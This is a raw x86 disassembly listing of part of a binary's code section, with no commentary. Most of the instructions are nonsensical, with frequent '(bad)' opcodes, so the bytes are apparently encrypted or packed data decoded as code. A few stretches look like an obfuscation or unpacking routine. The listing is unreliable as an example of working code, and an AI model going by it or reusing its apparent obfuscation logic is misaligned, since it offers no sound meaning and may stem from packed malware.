  40526a:	add    eax,0xc72ba871
  40526f:	clc    
  405270:	sbb    al,0x16
  405272:	inc    edi
  405273:	cmp    eax,0xfd3f0086
  405278:	and    eax,0xa58a5b3f
  40527d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40527e:	push   ss
  40527f:	add    eax,esi
  405281:	jnp    0x405266
  405283:	mov    cl,0x51
  405285:	and    esi,DWORD PTR [ebp-0x7c997524]
  40528b:	ret    
  40528c:	stos   BYTE PTR es:[edi],al
  40528d:	sbb    ecx,DWORD PTR [ecx+0x77]
  405290:	ins    BYTE PTR es:[edi],dx
  405291:	pop    ebp
  405292:	mov    dh,0xcb
  405294:	sbb    al,al
  405296:	lods   al,BYTE PTR ds:[esi]
  405297:	xchg   ebx,eax
  405298:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405299:	into   
  40529a:	sub    eax,DWORD PTR [ecx-0x25]
  40529d:	mov    bh,0x9f
  40529f:	(bad)  
  4052a0:	std    
  4052a1:	mov    al,0xfa
  4052a3:	ds inc esp
  4052a5:	rcl    DWORD PTR [ebx],cl
  4052a7:	sbb    edi,DWORD PTR [ebx-0x26]
  4052aa:	pusha  
  4052ab:	popa   
  4052ac:	push   eax
  4052ad:	push   esi
  4052ae:	mov    eax,0x88277c8a
  4052b3:	(bad)  
  4052b4:	cmp    eax,0x8431064f
  4052b9:	jno    0x405310
  4052bb:	mov    dh,0xb0
  4052bd:	arpl   WORD PTR [ecx+eiz*4],si
  4052c0:	push   cs
  4052c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4052c2:	mov    eax,0xbf7317b4
  4052c7:	push   ds
  4052c8:	add    DWORD PTR [eax],0x1cc3ff80
  4052ce:	jp     0x40528c
  4052d0:	mov    ecx,DWORD PTR [edx*2+0x78675db3]
  4052d7:	adc    eax,0xdd65e347
  4052dc:	adc    al,0xf0
  4052de:	or     DWORD PTR [eax],edx
  4052e0:	cmp    ecx,DWORD PTR [ebx+eiz*1]
  4052e3:	enter  0x6570,0x8
  4052e7:	inc    ecx
  4052e8:	ja     0x405351
  4052ea:	xchg   dh,dl
  4052ec:	aad    0xad
  4052ee:	mov    edx,0xa713e260
  4052f3:	int    0x16
  4052f5:	ins    BYTE PTR es:[edi],dx
  4052f6:	out    0x48,eax
  4052f8:	push   ebp
  4052f9:	mov    ch,0x52
  4052fb:	cmp    al,0xb2
  4052fd:	cmp    al,0xf5
  4052ff:	test   bh,bl
  405301:	dec    esi
  405302:	xor    bh,BYTE PTR [esi]
  405304:	fsubr  DWORD PTR [edi+eax*2]
  405307:	fimul  DWORD PTR [eax-0x50eda302]
  40530d:	xor    DWORD PTR [edx-0x435c0fd1],ebp
  405313:	pop    ebx
  405314:	cmc    
  405315:	repz pop ss
  405317:	sub    edi,ebx
  405319:	bound  esp,QWORD PTR [ecx+0x2a5d4df8]
  40531f:	and    DWORD PTR [ecx-0x61],ebp
  405322:	mov    esi,0xabe1d8e5
  405327:	popa   
  405328:	jb     0x40539a
  40532a:	inc    esi
  40532b:	adc    BYTE PTR [ebp-0x2d086dd3],ch
  405331:	ficomp WORD PTR [ebx+0x5200b8f3]
  405337:	cmp    cl,BYTE PTR [ebp-0x7d]
  40533a:	xchg   ebx,eax
  40533b:	ficom  DWORD PTR [ebx+0x1382ae54]
  405341:	ja     0x405306
  405343:	and    DWORD PTR [ebx-0x64f41b80],0x99b3c0d4
  40534d:	lods   eax,DWORD PTR ds:[esi]
  40534e:	mov    dl,0x47
  405350:	pop    DWORD PTR [ecx+eiz*1]
  405353:	mov    esi,0xa660e903
  405358:	jno    0x4053ac
  40535a:	adc    al,0x5c
  40535c:	xchg   ebx,eax
  40535d:	pop    es
  40535e:	cmp    dh,dh
  405360:	and    bl,BYTE PTR [ebx-0x68]
  405363:	mov    ds:0x322cc50,al
  405368:	push   cs
  405369:	in     eax,0x16
  40536b:	test   BYTE PTR [esi-0xf],0x6a
  40536f:	stos   DWORD PTR es:[edi],eax
  405370:	fsub   QWORD PTR fs:[esi]
  405373:	jno    0x405375
  405375:	btc    DWORD PTR [ebx-0x43319422],eax
  40537c:	cmp    BYTE PTR [edx+0x4e],dh
  40537f:	lds    ecx,FWORD PTR [ebx+0x114fa04a]
  405385:	data16 mul BYTE PTR [ecx+esi*1]
  405389:	mov    bl,0xe8
  40538b:	in     al,dx
  40538c:	mov    eax,ds:0x106741f1
  405391:	adc    al,0x21
  405393:	out    dx,al
  405394:	aam    0xcf
  405396:	lds    esi,FWORD PTR ds:[edi+0x9]
  40539a:	in     eax,0xdc
  40539c:	or     eax,DWORD PTR [ecx+0x331a6e9b]
  4053a2:	ins    DWORD PTR es:[edi],dx
  4053a3:	pop    esi
  4053a4:	xor    ebx,DWORD PTR [esi]
  4053a6:	mov    al,0xa9
  4053a8:	push   esi
  4053a9:	add    al,0x28
  4053ab:	add    al,0x7a
  4053ad:	mov    dl,0x55
  4053af:	je     0x405372
  4053b1:	and    al,0x0
  4053b3:	ret    0xd5c
  4053b6:	or     ebp,DWORD PTR [eax+0x4feaa168]
  4053bc:	cdq    
  4053bd:	adc    eax,0x72298099
  4053c2:	ss out 0x3,eax
  4053c5:	jae    0x405437
  4053c7:	mov    bh,0xe4
  4053c9:	add    esi,DWORD PTR [ecx+0x32]
  4053cc:	pop    edi
  4053cd:	and    cl,BYTE PTR [ebp-0x4]
  4053d0:	adc    al,0x22
  4053d2:	jl     0x4053a8
  4053d4:	mov    cs,ebp
  4053d6:	cli    
  4053d7:	arpl   WORD PTR [eax],sp
  4053d9:	mov    eax,ds:0xb59f4a1b
  4053de:	cmp    BYTE PTR [ecx+edi*1+0x33],cl
  4053e2:	mov    cl,0x6a
  4053e4:	sub    al,0xb2
  4053e6:	xor    esp,0xffffffe2
  4053e9:	les    edx,FWORD PTR [eax+0x29502374]
  4053ef:	test   eax,0x638b140b
  4053f4:	je     0x405376
  4053f6:	jecxz  0x405420
  4053f8:	pop    ebx
  4053f9:	dec    eax
  4053fa:	fucomip st,st(1)
  4053fc:	mov    DWORD PTR [edi+0x513e0584],esp
  405402:	dec    edx
  405403:	pop    es
  405404:	xchg   BYTE PTR [eax+0x73],dl
  405407:	xlat   BYTE PTR ds:[ebx]
  405408:	push   edi
  405409:	adc    esi,DWORD PTR [edx-0x43164543]
  40540f:	inc    eax
  405410:	jne    0x40546c
  405412:	sub    eax,0x869b1120
  405417:	jle    0x4053df
  405419:	mov    bh,0xfa
  40541b:	(bad)  
  40541c:	(bad)  
  40541d:	xchg   edx,eax
  40541e:	shr    BYTE PTR [ecx+0x666da527],1
  405424:	push   0xffffffb2
  405426:	outs   dx,DWORD PTR ds:[esi]
  405427:	inc    ebx
  405428:	cli    
  405429:	pop    ebp
  40542a:	pop    ebp
  40542b:	inc    ecx
  40542c:	or     al,bh
  40542e:	sub    BYTE PTR [ecx-0x45],0x83
  405432:	inc    eax
  405433:	mov    ds:0x1d3a1be9,eax
  405438:	inc    esi
  405439:	les    esp,FWORD PTR [eax+0x45e55d2d]
  40543f:	or     BYTE PTR [ecx+0x7b8af2be],cl
  405445:	and    al,0x7f
  405447:	(bad)  
  405448:	out    dx,eax
  405449:	dec    eax
  40544a:	sti    
  40544b:	leave  
  40544c:	pop    edx
  40544d:	pop    esp
  40544f:	cmp    bl,bh
  405451:	xor    eax,0xad86ce4c
  405456:	mov    dl,0xca
  405458:	pushf  
  405459:	mov    cl,0xc
  40545b:	jae    0x405416
  40545d:	mov    WORD PTR [eax+0x33ece415],cs
  405463:	cmp    edi,edx
  405465:	jbe    0x404ac0
  40546b:	mov    edx,DWORD PTR [ebp-0xc]
  40546e:	mov    edi,DWORD PTR [ebp-0x24]
  405471:	jmp    0x405774
  405476:	outs   dx,DWORD PTR ds:[esi]
  405477:	fisttp QWORD PTR [esi+0x6f6d8cef]
  40547d:	pop    ebp
  40547e:	fmul   QWORD PTR [edi+0xd09fbb8]
  405484:	jmp    0x7e6c2498
  405489:	jle    0x4054e3
  40548b:	jl     0x40550b
  40548d:	jle    0x4054ad
  40548f:	and    al,0x95
  405491:	mov    ch,0x14
  405493:	jbe    0x4054fe
  405495:	xor    ch,BYTE PTR [ebx]
  405497:	enter  0xb2f9,0xbc
  40549b:	sahf   
  40549c:	ss popf 
  40549e:	and    BYTE PTR [esi+0x52],0x8f
  4054a2:	jg     0x4054e8
  4054a4:	ss sbb ebp,ebp
  4054a7:	fcmovbe st,st(7)
  4054a9:	ins    DWORD PTR es:[edi],dx
  4054aa:	stos   BYTE PTR es:[edi],al
  4054ab:	xchg   ecx,eax
  4054ac:	mov    bh,bl
  4054ae:	fwait
  4054af:	in     al,dx
  4054b0:	cmp    BYTE PTR [ebx-0x6361642b],bh
  4054b6:	inc    ecx
  4054b7:	xchg   ebp,eax
  4054b8:	leave  
  4054b9:	scas   eax,DWORD PTR es:[edi]
  4054ba:	inc    edx
  4054bb:	sbb    esi,DWORD PTR [ebp-0x5013cdaa]
  4054c1:	popf   
  4054c2:	mov    edx,0xe860d1d2
  4054c7:	rol    BYTE PTR [ebx-0x494b2e49],cl
  4054cd:	rcr    ecx,1
  4054cf:	lahf   
  4054d0:	div    DWORD PTR [ebp-0x7a]
  4054d3:	push   ecx
  4054d4:	fiadd  WORD PTR [ebp-0x29fd4656]
  4054da:	hlt    
  4054db:	mov    ebx,0x9778eb33
  4054e0:	pop    ds
  4054e1:	push   cs
  4054e2:	inc    edx
  4054e3:	adc    DWORD PTR ds:0xe2ae86b5,edi
  4054e9:	mov    DWORD PTR [esi],0xf91b0550
  4054ef:	push   ss
  4054f0:	pop    ss
  4054f1:	mov    bl,0xfa
  4054f3:	sahf   
  4054f4:	pop    ecx
  4054f5:	jl     0x405479
  4054f7:	jl     0x4054ef
  4054f9:	mov    ds:0xd009a7a6,al
  4054fe:	and    DWORD PTR [eax+edx*2],0xffffffc0
  405502:	cmp    ebx,DWORD PTR [edx]
  405504:	je     0x4054bc
  405506:	stos   DWORD PTR es:[edi],eax
  405507:	repz push 0xc5fae82d
  40550d:	aam    0x75
  40550f:	mov    bl,0x82
  405511:	fcmovne st,st(4)
  405513:	pop    esp
  405514:	shl    BYTE PTR [edi+0x4],1
  405517:	not    BYTE PTR [eax-0x404fbf63]
  40551d:	(bad)  
  40551e:	or     eax,0xd6affb9
  405523:	push   esp
  405524:	lock shr edi,1
  405527:	fisub  DWORD PTR [ebp-0x22]
  40552a:	retf   0x883b
  40552d:	fisttp QWORD PTR [edi]
  40552f:	fstp   TBYTE PTR [eax]
  405531:	sbb    eax,0x266445bf
  405536:	jge    0x405543
  405538:	push   edx
  405539:	das    
  40553a:	sbb    al,0x6e
  40553c:	leave  
  40553d:	mov    ah,0x9d
  40553f:	fmul   DWORD PTR [eax]
  405541:	das    
  405542:	stos   DWORD PTR es:[edi],eax
  405543:	mov    bl,0x26
  405545:	je     0x4054fc
  405547:	hlt    
  405548:	fild   QWORD PTR [esp+esi*4-0x68]
  40554c:	ins    DWORD PTR es:[edi],dx
  40554d:	jns    0x405522
  40554f:	mov    ecx,DWORD PTR [ecx-0xcba6474]
  405555:	xchg   esp,eax
  405556:	jl     0x40555a
  405558:	cwde   
  405559:	adc    bh,bl
  40555b:	fld    TBYTE PTR [edi+0x2fab7ab7]
  405561:	pop    esp
  405562:	mov    dl,0x4
  405564:	and    DWORD PTR [edx+0x7c251ded],0xfffffffa
  40556b:	or     ecx,DWORD PTR [eax+0x36e27e39]
  405571:	daa    
  405572:	xchg   edx,eax
  405573:	cmp    bh,BYTE PTR [edx+0x12]
  405576:	push   ds
  405577:	(bad)  
  405578:	aam    0x27
  40557a:	sti    
  40557b:	adc    eax,0xfc413fee
  405580:	mov    cs,esi
  405582:	test   eax,0x68523874
  405587:	mov    ebp,0x419f8679
  40558c:	jg     0x40560b
  40558e:	ret    0xcde2
  405591:	mov    ?,WORD PTR [esi+0x25]
  405594:	call   0x54d5cc54
  405599:	xor    al,0xa0
  40559b:	enter  0x271e,0xe9
  40559f:	adc    BYTE PTR [ebx],bh
  4055a1:	cld    
  4055a2:	mov    fs,WORD PTR [esi]
  4055a4:	jge    0x40561d
  4055a6:	push   esp
  4055a7:	mov    cl,dl
  4055a9:	pop    edx
  4055aa:	stos   BYTE PTR es:[edi],al
  4055ab:	xchg   esi,eax
  4055ac:	dec    esi
  4055ad:	pushf  
  4055ae:	push   ss
  4055af:	and    BYTE PTR [ebx-0x1d],dl
  4055b2:	mov    fs,WORD PTR [ebx-0x31]
  4055b5:	ins    DWORD PTR es:[edi],dx
  4055b6:	and    esp,DWORD PTR [edi-0x4e57dc1e]
  4055bc:	push   edi
  4055bd:	cmp    bl,BYTE PTR [ecx+0x215c184c]
  4055c3:	pop    esp
  4055c4:	repz lock pop ss
  4055c7:	mov    ds:0x27df9f3c,al
  4055cc:	add    eax,DWORD PTR [esi+0x42506432]
  4055d2:	ret    0x33f3
  4055d5:	and    DWORD PTR [esp+ebp*1+0x50],0xa74ec84a
  4055dd:	rol    BYTE PTR [ecx+0x33205b84],0xc8
  4055e4:	scas   al,BYTE PTR es:[edi]
  4055e5:	and    al,BYTE PTR [ebx+0x27935324]
  4055eb:	xor    ebp,DWORD PTR [ecx]
  4055ed:	cs inc ecx
  4055ef:	popf   
  4055f0:	push   esi
  4055f1:	xor    eax,0xab53e158
  4055f6:	out    0x85,al
  4055f8:	sbb    edi,DWORD PTR [esi+ebx*2+0x69]
  4055fc:	call   0xe192:0x875322dd
  405603:	mov    ebx,0x40c3bba2
  405608:	inc    esi
  405609:	xchg   ebp,eax
  40560a:	sbb    ah,BYTE PTR [ebp-0x4754513f]
  405610:	jl     0x4055c6
  405612:	add    eax,0x51a4d03
  405617:	mov    fs,WORD PTR [edx-0x47]
  40561a:	adc    cl,BYTE PTR [ebx+0x69a78eea]
  405620:	mov    ebp,DWORD PTR [ecx+esi*1+0x65]
  405624:	lock std 
  405626:	adc    eax,0x167f31eb
  40562b:	jle    0x4055cc
  40562d:	dec    edx
  40562e:	adc    ch,BYTE PTR [edi+0x4aaed370]
  405634:	test   ah,dh
  405636:	push   ds
  405637:	or     BYTE PTR [edi+eiz*1],al
  40563a:	xor    ch,BYTE PTR [ecx+ebx*4+0x4a41b9ae]
  405641:	jle    0x405670
  405643:	rol    DWORD PTR [ebp+eax*1-0x6a6dbc5a],0x38
  40564b:	test   BYTE PTR [ebx-0x1b],0xfb
  40564f:	int    0x90
  405651:	inc    eax
  405652:	jbe    0x40566e
  405654:	gs pop edi
  405656:	sahf   
  405657:	push   ds
  405658:	bound  ebp,QWORD PTR [ebx-0x1f714d91]
  40565e:	xor    eax,0xb8179b1c
  405663:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405664:	mov    ah,0x78
  405666:	or     ch,BYTE PTR [edx]
  405668:	not    BYTE PTR [edx+0x21]
  40566b:	mov    dl,0xa0
  40566d:	and    al,0x3c
  40566f:	push   0x9574a599
  405674:	loop   0x4056c5
  405676:	dec    edi
  405677:	and    BYTE PTR [esi+0x78],cl
  40567a:	loopne 0x4056c0
  40567c:	add    eax,0x436e64c9
  405681:	int    0x43
  405683:	pop    esp
  405684:	adc    al,0x3c
  405686:	push   0xffffffe9
  405688:	mov    dh,0xb
  40568a:	dec    ebx
  40568b:	sub    ecx,edx
  40568d:	mov    edi,0x3fab0511
  405692:	sub    eax,0x7d0d44ad
  405697:	push   edi
  405698:	inc    esp
  405699:	xor    DWORD PTR [eax+0x438c4fca],eax
  40569f:	sbb    al,0x4b
  4056a1:	mov    WORD PTR [edi+0x0],ss
  4056a4:	fdivr  st,st(7)
  4056a6:	cmp    DWORD PTR ds:0x2302f15c,0x72
  4056ad:	in     al,dx
  4056ae:	enter  0x7382,0x25
  4056b2:	pusha  
  4056b3:	cmp    edx,DWORD PTR [ebp+0x2916cb56]
  4056b9:	mov    ebp,0xac48904a
  4056be:	std    
  4056bf:	xor    ch,BYTE PTR [ebx]
  4056c1:	cmp    dl,BYTE PTR [ecx]
  4056c3:	aas    
  4056c4:	repnz xor bh,cl
  4056c7:	daa    
  4056c8:	mov    ebp,0x59e0ad65
  4056cd:	xchg   esp,eax
  4056ce:	add    ebx,ecx
  4056d0:	out    0xb8,eax
  4056d2:	bound  edx,QWORD PTR [edi]
  4056d4:	pop    ebx
  4056d5:	popa   
  4056d6:	xchg   DWORD PTR [ecx+0x36f3b449],ebp
  4056dc:	les    ebx,FWORD PTR [ebx]
  4056de:	icebp  
  4056df:	xlat   BYTE PTR ds:[ebx]
  4056e0:	ds cmp eax,0xf949d9c5
  4056e6:	imul   esi,DWORD PTR [edx],0xffffffa0
  4056e9:	daa    
  4056ea:	jns    0x405708
  4056ec:	jecxz  0x405709
  4056ee:	or     al,BYTE PTR [edx+0x4f]
  4056f1:	pushf  
  4056f2:	sub    BYTE PTR [ecx+0x59e60207],bh
  4056f8:	xor    eax,0x66b6b728
  4056fd:	jg     0x4056b1
  4056ff:	sub    ebp,ecx
  405701:	mov    WORD PTR [esp+edx*2],fs
  405704:	cld    
  405705:	push   ss
  405706:	push   esp
  405707:	or     eax,0xf8a3b62b
  40570c:	ds jp  0x40575e
  40570f:	inc    eax
  405710:	cld    
  405711:	aas    
  405712:	out    0x8c,al
  405714:	sub    BYTE PTR [edx+0x7ff5f308],ah
  40571a:	cdq    
  40571b:	or     cl,BYTE PTR [eax-0x29]
  40571e:	into   
  40571f:	mov    dl,0x57
  405721:	popa   
  405722:	stos   BYTE PTR es:[edi],al
  405723:	add    al,0xd3
  405725:	outs   dx,DWORD PTR ds:[esi]
  405726:	xchg   esi,eax
  405727:	enter  0xfc7c,0xb9
  40572b:	sub    BYTE PTR [esi+0x6e],cl
  40572e:	sbb    DWORD PTR [ebp+0x514837a6],0x85ec2706
  405738:	popa   
  405739:	dec    ebx
  40573a:	cmp    edi,ebp
  40573c:	paddq  mm1,mm2
  40573f:	mov    al,0xc8
  405741:	xchg   esi,eax
  405742:	mov    al,bh
  405744:	xchg   ebp,eax
  405745:	add    ebp,DWORD PTR [ecx+0x3c]
  405748:	lods   al,BYTE PTR ds:[esi]
  405749:	sub    al,0x55
  40574b:	imul   esi,DWORD PTR [edi-0x17],0xfffffff4
  40574f:	dec    eax
  405750:	gs mov bl,0xfb
  405753:	sub    BYTE PTR [esi-0x22],bl
  405756:	or     edi,ebx
  405758:	rcr    BYTE PTR [ebx],1
  40575a:	(bad)  
  40575b:	fcom   DWORD PTR [edi-0x28]
  40575e:	jns    0x4056f1
  405760:	(bad)  
  405761:	or     eax,0x47e55ccc
  405766:	mov    DWORD PTR [ebp+edi*4-0x6f],esp
  40576a:	test   DWORD PTR [eax+0x30],eax
  40576d:	jo     0x4057c9
  40576f:	call   0xd033:0xfaafc4e1
  405776:	add    edx,ecx
  405778:	imul   edx,edi
  40577b:	mov    edi,DWORD PTR [ebp-0x18]
  40577e:	xor    edi,eax
  405780:	add    edx,edi
  405782:	mov    edi,DWORD PTR [ebp-0x8]
  405785:	lea    edx,[edx+edi*1+0x32729b]
  40578c:	mov    DWORD PTR [ebp-0x8],edx
  40578f:	mov    edx,DWORD PTR [ebp-0x20]
  405792:	xor    edx,eax
  405794:	mov    edi,0xffcd8d65
  405799:	sub    edi,edx
  40579b:	add    edi,DWORD PTR [ebp-0x10]
  40579e:	mov    edx,DWORD PTR [ebp-0x20]
  4057a1:	mov    ebx,DWORD PTR [ebp-0x8]
  4057a4:	xor    edx,eax
  4057a6:	add    edx,ecx
  4057a8:	imul   edx,ebx
  4057ab:	cmp    edx,edi
  4057ad:	jbe    0x4038ea
  4057b3:	pop    ebx
  4057b4:	pop    edi
  4057b5:	leave  
  4057b6:	ret    0x8
  4057b9:	push   ebp
  4057ba:	mov    ebp,esp
  4057bc:	push   ecx
  4057bd:	mov    ecx,DWORD PTR [ebp+0x8]
  4057c0:	and    eax,DWORD PTR ds:0x43379b
  4057c6:	mov    eax,0x7510854
  4057cb:	xor    DWORD PTR ds:0x4336a3,0x433683
  4057d5:	xor    ecx,eax
  4057d7:	not    DWORD PTR ds:0x4336df
  4057dd:	add    ecx,0x32729b
  4057e3:	jmp    0x405b32
  4057e8:	scas   eax,DWORD PTR es:[edi]
  4057e9:	inc    BYTE PTR [ebp-0x39]
  4057ec:	jne    0x4057b3
  4057ee:	lods   eax,DWORD PTR ds:[esi]
  4057ef:	jbe    0x4057a1
  4057f1:	loopne 0x4057f0
  4057f3:	mov    al,0x9c
  4057f5:	cs loop 0x40579c
  4057f8:	cmp    dh,BYTE PTR [esi]
  4057fa:	jle    0x40587a
  4057fc:	sub    al,0x7d
  4057fe:	jle    0x40587e
  405800:	xchg   ax,ax
  405802:	(bad)  
  405803:	adc    DWORD PTR [ebp-0x3e],edx
  405806:	sub    eax,DWORD PTR [ebp+esi*8-0x466ee2b2]
  40580d:	xchg   ebx,eax
  40580e:	pop    ebx
  40580f:	mov    ah,0x33
  405811:	mov    ebp,0x102c9dc3
  405816:	enter  0xead2,0x64
  40581a:	inc    ecx
  40581b:	jno    0x40584b
  40581d:	hlt    
  40581e:	lods   al,BYTE PTR ds:[esi]
  40581f:	jnp    0x4057e2
  405821:	jmp    0x40587f
  405823:	inc    edi
  405824:	sar    DWORD PTR [ebp+0x66582755],1
  40582a:	dec    ebx
  40582b:	mov    DWORD PTR [edx+0x1],ebp
  40582e:	inc    ecx
  40582f:	adc    al,0x57
  405831:	ret    0xc657
  405834:	shl    BYTE PTR [ebp+0x19a1bc42],cl
  40583a:	fmul   DWORD PTR [eax+0x406fa9e6]
  405840:	jmp    0x34d7ba19
  405845:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405846:	jb     0x405859
  405848:	dec    ebx
  405849:	test   DWORD PTR ds:0x843031bf,0x4a4e44c9
  405853:	pop    ss
  405854:	xor    al,0x9b
  405856:	mov    eax,0x36198143
  40585b:	mov    eax,ds:0x8b464f0e
  405860:	adc    esp,eax
  405862:	inc    edx
  405863:	push   ebp
  405864:	imul   ecx,DWORD PTR [ecx+0x7d6a61d0],0xc28c7065
  40586e:	mov    dl,BYTE PTR [eax+0x68977262]
  405874:	outs   dx,DWORD PTR ds:[esi]
  405875:	in     eax,0x55
  405877:	cmp    al,0x6c
  405879:	push   ds
  40587a:	mov    eax,0x91d84742
  40587f:	sub    BYTE PTR [esi+0x4ce8e820],ah
  405885:	mov    ds:0x5e632704,al
  40588a:	test   eax,0x7ac7a627
  40588f:	(bad)  
  405890:	pushf  
  405891:	add    ch,BYTE PTR [eax+ebp*4+0x57]
  405895:	dec    edx
  405896:	sahf   
  405897:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405898:	dec    edx
  405899:	cs inc esi
  40589b:	int3   
  40589c:	and    esi,ebp
  40589e:	jns    0x40590b
  4058a0:	lahf   
  4058a1:	dec    ebx
  4058a2:	inc    ebx
  4058a3:	jmp    0x4058e1
  4058a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4058a6:	out    0x63,al
  4058a8:	mov    bl,0x6b
  4058aa:	cmp    DWORD PTR ds:0xbc09e40f,eax
  4058b0:	adc    ecx,0xffffff91
  4058b3:	push   esi
  4058b4:	in     al,0x8
  4058b6:	ds jle 0x405861
  4058b9:	adc    eax,ebp
  4058bb:	pop    ecx
  4058bc:	sub    ecx,esi
  4058be:	lods   eax,DWORD PTR ds:[esi]
  4058bf:	inc    ebx
  4058c0:	xor    eax,0x4bfe8f37
  4058c5:	inc    esi
  4058c6:	xor    eax,0xec26ff76
  4058cb:	or     BYTE PTR [edi+0x3e],dh
  4058ce:	pushf  
  4058cf:	xchg   BYTE PTR ds:0xa7adbc38,cl
  4058d5:	mov    esi,?
  4058d7:	in     eax,dx
  4058d8:	cmp    ebx,DWORD PTR [esi+ecx*2+0x77949d3f]
  4058df:	dec    ebp
  4058e0:	das    
  4058e1:	mov    eax,ds:0x2d418660
  4058e6:	cwde   
  4058e7:	jle    0x405879
  4058e9:	mov    ah,0x56
  4058eb:	(bad)  
  4058ed:	jg     0x40592e
  4058ef:	(bad)  
  4058f0:	fstp   st(2)
  4058f2:	aam    0xc5
  4058f4:	not    ebx
  4058f6:	push   ds
  4058f7:	cdq    
  4058f8:	into   
  4058f9:	add    al,0xc1
  4058fb:	adc    edx,DWORD PTR [ecx]
  4058fd:	adc    al,0x63
  4058ff:	push   0xffffffb0
  405901:	inc    eax
  405902:	fwait
  405903:	sbb    al,0x19
  405905:	retf   0xdfaf
  405908:	sar    BYTE PTR [eax],cl
  40590a:	pop    eax
  40590b:	mov    bl,0x8f
  40590d:	inc    edi
  40590e:	gs mov ebp,0xdee9d1e6
  405914:	push   ebp
  405915:	cmp    DWORD PTR [edi+ebp*2-0xff1cb1f],eax
  40591c:	mov    al,ds:0xe3c4316c
  405921:	test   cl,dh
  405923:	adc    BYTE PTR [bx+si-0x36],dl
  405927:	push   eax
  405928:	in     al,dx
  405929:	pop    ebx
  40592a:	dec    eax
  40592b:	stos   BYTE PTR es:[edi],al
  40592c:	mov    bl,0xe6
  40592e:	rcr    DWORD PTR [esi-0x1b],1
  405931:	fmul   st,st(4)
  405933:	scas   eax,DWORD PTR es:[edi]
  405934:	imul   esi,esp,0x78b5c87b
  40593a:	or     dl,BYTE PTR [ecx+0x3f]
  40593d:	jb     0x40599d
  40593f:	loope  0x405987
  405941:	sbb    al,0x19
  405943:	out    0x4a,eax
  405945:	lods   al,BYTE PTR ds:[esi]
  405946:	lods   eax,DWORD PTR ds:[esi]
  405947:	push   0x69
  405949:	jg     0x405906
  40594b:	(bad)  
  40594c:	ret    0xbb1
  40594f:	cmp    ax,0x735e
  405953:	push   0x4b
  405955:	cmp    DWORD PTR [ecx+eax*1+0x42bf6208],0xffffff90
  40595d:	jmp    0x40595f
  40595f:	or     al,bh
  405961:	cmp    al,0x4c
  405963:	sar    BYTE PTR [eax+0x7b],1
  405966:	mov    dh,0x44
  405968:	xchg   esp,eax
  405969:	repz pop edi
  40596b:	pusha  
  40596c:	jg     0x40597b
  40596e:	dec    edx
  40596f:	in     eax,0x52
  405971:	addr16 mov ch,0xfc
  405974:	fucompp 
  405976:	jns    0x4059cc
  405978:	mov    edx,0x88aa732
  40597d:	cld    
  40597e:	loop   0x40592c
  405980:	ficom  WORD PTR [eax]
  405982:	mov    dh,0xaf
  405984:	inc    esp
  405985:	(bad)  
  405986:	dec    esp
  405987:	es in  al,0xa
  40598a:	mov    ah,0xf4
  40598c:	fbld   TBYTE PTR [edi-0x69]
  40598f:	xchg   ebx,eax
  405990:	jle    0x40596b
  405992:	adc    edx,ebp
  405994:	ja     0x405999
  405996:	jmp    0x4059c7
  405998:	pop    es
  405999:	pop    ebp
  40599a:	jns    0x40598d
  40599c:	inc    ebp
  40599d:	test   BYTE PTR [esi+0x6c],bl
  4059a0:	fnstenv [ecx-0x38]
  4059a3:	xor    BYTE PTR [eax],0x61
  4059a6:	push   ecx
  4059a7:	imul   edx,ebx,0xc1465aa6
  4059ad:	dec    ebx
  4059ae:	shl    BYTE PTR [edi-0x6f437b0c],cl
  4059b4:	in     al,dx
  4059b5:	lods   eax,DWORD PTR ds:[esi]
  4059b6:	add    eax,0x2b965d21
  4059bb:	mov    ebx,DWORD PTR ds:[edx-0x48faa7f3]
  4059c2:	add    al,0xce
  4059c4:	adc    eax,0x10d61ef0
  4059c9:	fmul   QWORD PTR [ebp-0x5239cbe7]
  4059cf:	mov    DWORD PTR [eax-0x3c6e0622],ebx
  4059d5:	mov    al,cl
  4059d7:	aaa    
  4059d8:	and    BYTE PTR [ebp-0x1ef0f00d],ah
  4059de:	add    ah,dl
  4059e0:	or     esp,DWORD PTR gs:[eax+0x40]
  4059e4:	mov    ds:0xb043bc23,eax
  4059e9:	(bad)  
  4059ea:	pop    ds
  4059eb:	jae    0x405a12
  4059ed:	loope  0x405973
  4059ef:	(bad)  
  4059f0:	lock cmp al,0x30
  4059f3:	(bad)  
  4059f4:	cmp    eax,0xb7e36566
  4059f9:	xchg   edi,eax
  4059fa:	xor    DWORD PTR [esi-0x362db895],ebx
  405a00:	pop    esp
  405a01:	and    bl,bl
  405a03:	dec    ebp
  405a04:	ins    BYTE PTR es:[edi],dx
  405a05:	adc    ch,BYTE PTR [ebx+0x4c0973bc]
  405a0b:	aam    0x12
  405a0d:	iret   
  405a0e:	push   ecx
  405a0f:	sub    DWORD PTR [esp+ebx*8+0x2f],eax
  405a13:	pop    ebp
  405a14:	mov    ch,0x48
  405a16:	clc    
  405a17:	ja     0x405a2d
  405a19:	pop    ebp
  405a1a:	fcomp  QWORD PTR [edx+edi*1+0x109fc157]
  405a21:	cmp    eax,0x739c9305
  405a26:	mov    es,WORD PTR [ecx-0x70]
  405a29:	add    ch,bh
  405a2b:	daa    
  405a2c:	dec    ebx
  405a2d:	adc    al,dh
  405a2f:	or     DWORD PTR [esi+0x601169b0],ebp
  405a35:	je     0x405a77
  405a37:	call   0x2cdb6a55
  405a3c:	addr16 mov ds:0x61cb,eax
  405a40:	mov    DWORD PTR [esi],ebx
  405a42:	dec    edx
  405a43:	addr16 jae 0x405a7b
  405a46:	sti    
  405a47:	idiv   DWORD PTR [edi-0x36]
  405a4a:	adc    eax,0xdf62272c
  405a4f:	sbb    al,0x20
  405a51:	imul   ebp,DWORD PTR [edi],0xfe2cbf58
  405a57:	sbb    ah,BYTE PTR [edi+0x54a52d3a]
  405a5d:	ret    0xeb73
  405a60:	pop    ecx
  405a61:	jg     0x405a64
  405a63:	and    edx,ecx
  405a65:	mov    BYTE PTR [eax-0x5842c732],dh
  405a6b:	inc    esi
  405a6c:	pop    ss
  405a6d:	sbb    BYTE PTR [eax-0x5d2f34cb],bh
  405a73:	neg    BYTE PTR [edi-0x55]
  405a76:	dec    ecx
  405a77:	loope  0x405a04
